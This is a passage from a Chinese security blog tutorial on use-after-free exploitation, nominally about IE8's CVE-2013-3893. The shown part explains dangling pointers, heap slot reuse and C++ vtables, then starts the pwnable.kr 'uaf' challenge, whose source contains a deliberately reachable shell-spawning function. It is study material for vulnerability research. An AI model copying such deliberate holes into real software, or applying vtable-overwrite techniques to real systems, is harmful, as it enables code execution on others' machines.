<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>IE8的一个释放后重用(UAF):CVE-2013-3893 | Migraine殇</title><meta name="keywords" content="仍在学习的苦旅中"><meta name="author" content="Migraine殇"><meta name="copyright" content="Migraine殇"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="漏洞战争上一个经典的IE8释放后重用">
<meta property="og:type" content="article">
<meta property="og:title" content="IE8的一个释放后重用(UAF):CVE-2013-3893">
<meta property="og:url" content="https://migraine-sudo.github.io/2019/11/07/%E6%B5%8F%E8%A7%88%E5%99%A8UAF/index.html">
<meta property="og:site_name" content="Migraine殇">
<meta property="og:description" content="漏洞战争上一个经典的IE8释放后重用">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/NKHE2n.jpg">
<meta property="article:published_time" content="2019-11-06T16:15:29.000Z">
<meta property="article:modified_time" content="2023-08-14T03:27:52.718Z">
<meta property="article:author" content="Migraine殇">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="Exploit">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/NKHE2n.jpg"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://migraine-sudo.github.io/2019/11/07/%E6%B5%8F%E8%A7%88%E5%99%A8UAF/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="manifest" href="/manifest.json"/><link rel="apple-touch-icon" sizes="180x180" href="/images/icons/icon-512x512.png"/><link rel="icon" type="image/png" sizes="32x32" href="/images/icons/icon-512x512.png"/><link rel="icon" type="image/png" sizes="16x16" href="/images/icons/icon-512x512.png"/><link rel="mask-icon" href="/images/icons/icon-512x512.png" color="#5bbad5"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-08-14 11:27:52'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    })(window)</script><meta name="generator" content="Hexo 5.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/%E6%88%88%E8%96%87.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">35</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">16</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/NKHE2n.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Migraine殇</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">IE8的一个释放后重用(UAF):CVE-2013-3893</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-11-06T16:15:29.000Z" title="发表于 2019-11-07 00:15:29">2019-11-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-08-14T03:27:52.718Z" title="更新于 2023-08-14 11:27:52">2023-08-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/IE%E6%BC%8F%E6%B4%9E/">IE漏洞</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"> <a id="more"></a>

<div class="note info modern"><p>关键词：</p>
<p>UAF 精确堆喷射 ROP DEP</p>
</div>

<div class="note primary modern"><p>阅读辅助：</p>
<p>IE相关漏洞：<a href="https://migraine-sudo.github.io/2019/12/21/Shellcode-Write/">Shellcode编写</a>-&gt;<a href="https://migraine-sudo.github.io/2019/11/07/%E6%B5%8F%E8%A7%88%E5%99%A8UAF/">IE的UAF分析</a>-&gt; <a href="https://migraine-sudo.github.io/2019/12/01/CVE-2012-1876/">IE堆溢出利用</a> </p>
<p>JS Engine相关：<a href="https://migraine-sudo.github.io/2020/02/15/v8/">V8基础</a>-&gt;<a href="https://migraine-sudo.github.io/2019/12/20/qwn2own/">jscore exloit</a>&gt;<a href="https://migraine-sudo.github.io/2020/02/22/roll-a-v8/">roll a d8</a>-&gt;<a href="https://migraine-sudo.github.io/2020/10/06/v8-Instrumentation/">对V8进行插桩</a></p>
<p>CTF相关漏洞：<a href="https://migraine-sudo.github.io/2019/11/22/how2heap1/">how2heap One</a>-&gt;<a href="https://migraine-sudo.github.io/2019/11/25/how2heap2/">how2heap Two</a>-&gt;<a href="https://migraine-sudo.github.io/2020/01/25/how2heap3/">how2heap Three</a>-&gt;<a href="https://migraine-sudo.github.io/2020/01/27/how2heap4/">how2heap Four</a></p>
</div>

<h1 id="0x01通过一道PWN题理解UAF"><a href="#0x01通过一道PWN题理解UAF" class="headerlink" title="0x01通过一道PWN题理解UAF"></a>0x01通过一道PWN题理解UAF</h1><h2 id="1-1UAF基础概念"><a href="#1-1UAF基础概念" class="headerlink" title="1.1UAF基础概念"></a>1.1UAF基础概念</h2><p>UAF漏洞全称为use after free，即释放后重用。漏洞产生的原因，在于内存在被释放后，但是指向指针并没有被删除，又被程序调用。比较常见的类型是C++对象，利用UAF修改C++的虚函数表导致的任意代码执行。</p>
<p>在了解UAF是导致任意代码执行的细节，首先让我们了解几个概念：</p>
<p>悬挂指针、内存占坑、C++虚函数</p>
<p>实验源码如下</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// UAFv1.cpp : 定义控制台应用程序的入口点。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> size 32</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span> :</span><br><span class="line">	<span class="keyword">int</span> base;</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">f</span><span class="params">()</span></span>&#123; <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Base::f()&quot;</span>&lt;&lt;<span class="built_in">endl</span>;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">g</span><span class="params">()</span></span>&#123;<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Base::g()&quot;</span>&lt;&lt;<span class="built_in">endl</span>;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">h</span><span class="params">()</span></span>&#123;<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Base::h()&quot;</span>&lt;&lt;<span class="built_in">endl</span>;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Child</span>:</span><span class="keyword">public</span> Base</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="keyword">int</span> child;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">()</span></span>&#123;<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Child::f()&quot;</span>&lt;&lt;<span class="built_in">endl</span>;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">g1</span><span class="params">()</span></span>&#123;<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Child::g1()&quot;</span>&lt;&lt;<span class="built_in">endl</span>;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">h1</span><span class="params">()</span></span>&#123;<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Child::h1()&quot;</span>&lt;&lt;<span class="built_in">endl</span>;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">char</span> *buf1;</span><br><span class="line">	<span class="keyword">char</span> * buf2;</span><br><span class="line">	<span class="comment">//Lab1</span></span><br><span class="line">	buf1=(<span class="keyword">char</span> *)<span class="built_in">malloc</span>(size);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;buf1:0x%p\n&quot;</span>,buf1);</span><br><span class="line">	<span class="built_in">free</span>(buf1);</span><br><span class="line"></span><br><span class="line">	buf2=(<span class="keyword">char</span> *)<span class="built_in">malloc</span>(size);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;buf2:0x%p\n&quot;</span>,buf2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(buf2,<span class="number">0</span>,size);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;buf2:%d\n&quot;</span>,*buf2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;====Use Afrer Free====\n&quot;</span>);</span><br><span class="line">	<span class="built_in">strncpy</span>(buf1,<span class="string">&quot;hack&quot;</span>,<span class="number">5</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;buf2:%s\n\n&quot;</span>,buf2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(buf2);</span><br><span class="line">	<span class="comment">//Lab2</span></span><br><span class="line">	Base *B=<span class="keyword">new</span> Base();</span><br><span class="line">	Base *C=<span class="keyword">new</span> Child();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p><img src="https://s2.ax1x.com/2019/11/07/MA1z9S.png"></p>
<h3 id="1-1-1悬挂指针-Dangling-pointer"><a href="#1-1-1悬挂指针-Dangling-pointer" class="headerlink" title="1.1.1悬挂指针(Dangling pointer)"></a>1.1.1悬挂指针(Dangling pointer)</h3><p>指向被释放的对象内存的指针。</p>
<p>成因：释放掉后没有将指针重置为null，导致指针依旧可以访问，并且继续指向已经释放的内存.UAF便是调用悬挂指针（多为C++对象），通过对这段内存提前的设计，使得程序调用我们设计好的程序。</p>
<p>案例程序中，为buf1分配了一段32字节的空间，然后将其释放。</p>
<p>但是当使用strncpy对已经释放的buf1拷贝字符串时，发现被free的buf1依然是可以访问的，并且指向的内存没有变化。</p>
<p><img src="https://s2.ax1x.com/2019/11/07/MA1XAP.png"><br><img src="https://s2.ax1x.com/2019/11/07/MA1T6H.png"></p>
<p>释放后的buf1依然指向原来的内存，此时的buf1就是一个悬挂指针。</p>
<p><img src="https://s2.ax1x.com/2019/11/07/MA1bnA.png"><br><img src="https://s2.ax1x.com/2019/11/07/MA1htK.png"></p>
<h3 id="1-1-2占坑"><a href="#1-1-2占坑" class="headerlink" title="1.1.2占坑"></a>1.1.2占坑</h3><p>了解堆分配的占坑机制，需要了解SLUB系统内存分配机制。和SLAB不同，这种利用方法对对象类型没有限制，两个对象只要大小差不多就可以重用同一块内存，也就是说我们释放掉对象A以后马上再申请对象B，只要两者大小相同，那么B就很有可能重用A的内存。</p>
<p>见案例中，释放buf1时，buf1指向0xa35470的内存。而在buf1释放之后，立即分配一个相同大小的内存给buf2指针，发现buf2获取的指针指向的就是buf1被释放的内存地址。</p>
<p>这就是buf2占坑了buf1的内存空间。</p>
<p>此时发散一下思维，buf2可控，而buf1仍然指向buf2的内存空间，是不是就有可能造成程序出现问题。</p>
<p><img src="https://s2.ax1x.com/2019/11/07/MA39Xj.png"><img src="https://s2.ax1x.com/2019/11/07/MA1htK.png"><img src="https://s2.ax1x.com/2019/11/07/MA3VhT.png"><img src="https://s2.ax1x.com/2019/11/07/MA3m3F.png"></p>
<h3 id="1-1-3虚函数"><a href="#1-1-3虚函数" class="headerlink" title="1.1.3虚函数"></a>1.1.3虚函数</h3><p>C++中的虚函数的作用主要是实现了多态的机制。简而言之就是用父类型别的指针指向其子类的实例，然后通过父类的指针调用实际子类的成员函数。这种技术可以让父类的指针有“多种形态”。代码表现形式就是C++类中Virtaul开头的函数。</p>
<p>同时C++的虚函数是漏洞攻击的重点对象，C++对象中有一个非常重要的结构–虚函数表。</p>
<p>覆盖C++虚函数造成的漏洞利用技术的风靡程度，不亚于经典栈溢出的覆盖手法。更重要的是覆盖虚函数表还可以从本质上绕过GS等内存保护机制，这里不展开说了。</p>
<p>详细的逆向分析，非常推荐《C++反汇编揭秘》这本书，将虚函数的反汇编代码和C++代码进行对比，理解会比较深刻。</p>
<p><img src="https://s2.ax1x.com/2019/11/07/MA3Mu9.png"></p>
<p>代码分别实例化了Base和Child为B和C，查看内存结构。</p>
<p>Base对象B的首地址存放_vfptr(虚函数表)，指向三个虚函数f()、g()、 h() </p>
<p><img src="https://s2.ax1x.com/2019/11/07/MA33Ax.png"></p>
<p>Child对象C的首地址是对基类（Base）的一个拷贝，值得注意的是Base类里的虚函数表，这里的f()函数被Child重写，g和h函数则依然指向Base实例化时其在虚函数表中的地址。</p>
<p>C的第二个地址则指向自己的虚函数表。</p>
<p><img src="https://s2.ax1x.com/2019/11/07/MA3Nge.png"></p>
<p>这些继承关系，可以简单概括为下面三张图。</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/S369oH.png" alt="S369oH"></p>
<p>接下来我们观察代码是如何生成C++虚函数表的。</p>
<p>首先v2&#x3D;operator new(8u) 对应Base *B&#x3D;new Base()实例化对象，v2为指向对象的指针。</p>
<p>实例化对象之后，C++会将虚函数表的地址放在对象内存的开头。</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/5AOsD4.png" alt="5AOsD4"></p>
<p>进入sub_411140函数之后经过二次跳转进入sub_4117A0函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">text:004117C3                 mov     eax, [ebp+var_8]</span><br><span class="line"></span><br><span class="line">.text:004117C6                 mov     dword ptr [eax], offset ??_7Base@@6B@ ; const Base::&#96;vftable&#39;</span><br></pre></td></tr></table></figure>
<p>mov操作将虚函数表地址放到[eax]的位置，而此时eax的值就是通过上层函数传递下来的v2的指针。所以这段代码就完成了将虚表放置到对象头部的效果。</p>
<p>这一步骤之后，也就能理解为什么虚函数表会在对象表头，同时这个操作也是我们用来判断C++对象创建的一个非常好的信号，还可以获取这个对象的头部地址和虚表。 </p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/j8XKXz.png" alt="j8XKXz"></p>
<h2 id="1-2通过PWN题掌握UAF"><a href="#1-2通过PWN题掌握UAF" class="headerlink" title="1.2通过PWN题掌握UAF"></a>1.2通过PWN题掌握UAF</h2><p>在掌握了基础之后，我们可以拿pwnalbe.kr 的UAF题来快速理解利用原理。</p>
<p>使用scp下载二进制文件和源码（密码:guest）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ scp -P2222 uaf@pwnable.kr:&#x2F;home&#x2F;uaf&#x2F;uaf  &#x2F;Users&#x2F;p0kerface&#x2F;</span><br><span class="line"></span><br><span class="line">$ scp -P2222 uaf@pwnable.kr:&#x2F;home&#x2F;uaf&#x2F;uaf.cpp  &#x2F;Users&#x2F;p0kerface&#x2F;</span><br></pre></td></tr></table></figure>

<p>主要思路便是利用占坑的方法，向被释放的空间写入数据覆盖vfptr（虚函数表），然后调用悬挂指针完成UAF，这题非常经典值得在做UAF之前的复习。</p>
<p>调试过程中，意识到自己阅读C++的反汇编水平还是不够，类和对象没有源码只看IDA还是非常困难的。所以会把一些逆向的笔记记录下来。</p>
<p>程序源码</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">uaf.cpp</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span>&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">​	<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">give_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">​		system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">​	&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">​	<span class="keyword">int</span> age;</span><br><span class="line">​	<span class="built_in">string</span> name;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">​	<span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">​		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;My name is &quot;</span> &lt;&lt; name &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">​		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;I am &quot;</span> &lt;&lt; age &lt;&lt; <span class="string">&quot; years old&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">​	&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Man</span>:</span> <span class="keyword">public</span> Human&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">​	Man(<span class="built_in">string</span> name, <span class="keyword">int</span> age)&#123;</span><br><span class="line">​		<span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">​		<span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">​        &#125;</span><br><span class="line">​        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">​		Human::introduce();</span><br><span class="line">​                <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;I am a nice guy!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">​        &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Woman</span>:</span> <span class="keyword">public</span> Human&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">​        Woman(<span class="built_in">string</span> name, <span class="keyword">int</span> age)&#123;</span><br><span class="line">​                <span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">​                <span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">​        &#125;</span><br><span class="line"></span><br><span class="line">​        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">​                Human::introduce();</span><br><span class="line">​                